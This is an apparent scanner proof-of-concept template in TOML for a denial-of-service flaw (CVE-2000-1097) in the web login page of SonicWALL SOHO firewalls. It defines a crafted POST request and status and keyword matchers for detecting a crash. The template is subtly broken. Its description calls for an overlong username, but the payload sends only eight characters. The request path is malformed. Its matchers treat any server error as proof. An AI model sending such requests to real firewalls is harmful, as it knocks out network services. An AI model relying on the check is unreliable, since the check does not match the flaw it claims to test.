[info]
author = "AVE"
description = "通过向 SonicWALL SOHO 防火墙 4.0/5.0 的 Web 认证页面发送超长用户名字符串，触发输入验证缺陷导致 Web 服务进程崩溃，造成拒绝服务。发送包含超长 username 参数的 HTTP 请求至认证页面即可验证。"
id = "POC-AVE-2000-1082"
name = "SonicWALL SOHO Firewall Web Server DoS PoC"
severity = "medium"
tags = ["ave-2000-1082"]
vuln_id = [
    "CVE-2000-1097",
    "AVE-2000-1082",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/auth.html"
protocol = "http"

[poc.requests.body]
content = "username=AAAAAAAA&password=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Internal Server Error",
    "connection refused",
]
